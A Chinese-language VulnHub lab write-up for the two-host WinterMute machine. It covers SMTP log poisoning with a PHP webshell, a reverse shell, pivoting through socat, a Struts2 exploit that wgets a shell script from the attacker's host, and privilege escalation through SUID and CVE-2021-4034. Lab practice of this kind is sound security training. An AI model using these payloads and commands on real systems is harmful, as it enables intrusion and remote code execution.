+++
title = '0x063 WinterMute '
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



这台靶场是个双主机靶场

# 第一台主机

192.168.5.104

## 端口扫描

![](/vulnhub_img/WEBRESOURCE68c362deba429ae69fed45d9517b9ca8image.png)

![](/vulnhub_img/WEBRESOURCEa844d08924c6c9dadd2bb5ffc0ee911dimage.png)

![](/vulnhub_img/WEBRESOURCEdf5d149940645e9df81a43506f469ab1image.png)

## 渗透

80端口

![](/vulnhub_img/WEBRESOURCE060cc8d1dc9a6d9c316b2b25b1a11c95image.png)

![](/vulnhub_img/WEBRESOURCEc2c79a3c50e937e7793df04a89cd245cimage.png)

3000端口

admin/admin直接进入：

![](/vulnhub_img/WEBRESOURCE1e24b0dee6fe4c2b9da1c19f677f1f03image.png)

然后这里是我没想到的，这里是http的路径：

![](/vulnhub_img/WEBRESOURCEa2e96b80478f41f60c93808700481a0fimage.png)

打开：

![](/vulnhub_img/WEBRESOURCE53f87dad94e3a0ef6f07caad760c742eimage.png)

最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：

![](/vulnhub_img/WEBRESOURCE2fec6124137d88692b38ab00d84133b0image.png)

使用NC写入webshell：

```
nc 192.168.5.108 25 			#连接邮件服务器
helo root						#标识用户身份
mail from:"ROOT <?php system($_GET['a']);?>"   #发件人，木马所在地
rcpt to:root					#收件人
data							#编辑
.							    #编辑结束
quit							#退出nc
```

这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用&：

![](/vulnhub_img/WEBRESOURCE2fa3b558d7bc141d559d5402c4cfcfc2image.png)

反弹shell:

![](/vulnhub_img/WEBRESOURCE963c068bf535ff76fc31b0879b987ce6image.png)

![](/vulnhub_img/WEBRESOURCE80b38633a18415990dacc18a3e179170image.png)

# 提权

SUID：

![](/vulnhub_img/WEBRESOURCE0427285f16c161ce1c6233b0adf8c7feimage.png)

![](/vulnhub_img/WEBRESOURCEfc75302ecb7e9d34e40eb6105bab0402image.png)

![](/vulnhub_img/WEBRESOURCEbfa6c620f5853a3cc13a7aab78f58b7dimage.png)

![](/vulnhub_img/WEBRESOURCE508789be6ddfaa4e7751c8ea01b07641image.png)

![](/vulnhub_img/WEBRESOURCEad6ded3d3605a4497411630063683c9eimage.png)

# 第二台靶机

第二网卡：

192.168.56.103/24网段：

![](/vulnhub_img/WEBRESOURCE44bde5ae34bf24033969f2e96d8dfeccimage.png)

本来想创建创建远程端口转发的，但是ssh版本不够：

sudo systemctl restart ssh.service

ssh -N -R 9998 [kali@192.168.5.66](http://kali@192.168.5.66)

需要ssh版本7.6以及以上：

![](/vulnhub_img/WEBRESOURCE506cf098d91af47c35f65e9fcc2a26eeimage.png)

那就挨个代理出来：

先进行IP扫描：

```
NET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP &> /dev/null`; then echo -e "$NET$IP is \033[31mup\033[0m" ; else echo -e "$NET$IP is \033[32mdown\033[0m";  fi ; done
```

![](/vulnhub_img/WEBRESOURCE2ee8dba66e84ede94794aba403c6eecaimage.png)

102可能性最大，端口扫描：

```
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2>&1; done | grep -v "Connection refused"
```

![](/vulnhub_img/WEBRESOURCE15703d7835e6c9fbcff64f91ee55de0aimage.png)

用socat把端口代理出来：

![](/vulnhub_img/WEBRESOURCEa157d5dbcba06da73ac7134a2147d73cimage.png)

```
socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.102:8009 &
socat TCP-LISTEN:8080,fork,reuseaddr tcp:192.168.56.102:8080 &
socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.102:34483 &
```

![](/vulnhub_img/WEBRESOURCE017206957e78a558751f5f69e2eb56b2image.png)

重新扫描一下：

![](/vulnhub_img/WEBRESOURCE93398a132faf925a6b1a936045ffdaf6image.png)

打一半网断了，后面IP变了：

![](/vulnhub_img/WEBRESOURCE4f998a09b6efff34f2764a1fd72a1993image.png)

![](/vulnhub_img/WEBRESOURCE1cd5b6ce008108bc3a7c9ad77d08ba17image.png)

这里没注意，原来note是提示：

![](/vulnhub_img/WEBRESOURCEf03bc91d1e561d041b06bea5fe21e6b5image.png)

这个就显而易见了，struts2漏洞：

![](/vulnhub_img/WEBRESOURCE8c32ffbcd5282a46b31ec7c971c743beimage.png)

先创建一个端口转发，以便于把shell传回kali:

```
socat TCP-LISTEN:9999,fork,reuseaddr tcp:192.168.5.66:9999 &
```

去exploit-db找一个脚本：

![](/vulnhub_img/WEBRESOURCEa9269de1cceb517cc694086d5d0af425image.png)

但是这里没反应，感觉是哪里有问题，既然nc和bash没反应，可以试试写入sh脚本：

![](/vulnhub_img/WEBRESOURCE273eb9f5ca755c7151db7a2a5fec477fimage.png)

再建一个端口转发：

```
socat TCP-LISTEN:7777,fork,reuseaddr tcp:192.168.5.66:80 &
```

python 42324.py [http://192.168.5.111:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action](http://192.168.5.111:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action) "wget [http://192.168.56.103:7777/shell.sh](http://192.168.56.103:7777/shell.sh)"

有反应

![](/vulnhub_img/WEBRESOURCE036f4cd67d3bcbc5a131d85024dc1fe0image.png)

又失败了，放到tmp目录试试：

![](/vulnhub_img/WEBRESOURCEed6004a575fbf4af8ca164949627dea5image.png)

msfvenom:

![](/vulnhub_img/WEBRESOURCE503cf14f6615ad9193e16cd7628c8478image.png)

# 提权

2021-4034

![](/vulnhub_img/WEBRESOURCE27e469b9c5e01820fb797dda5c4202b0image.png)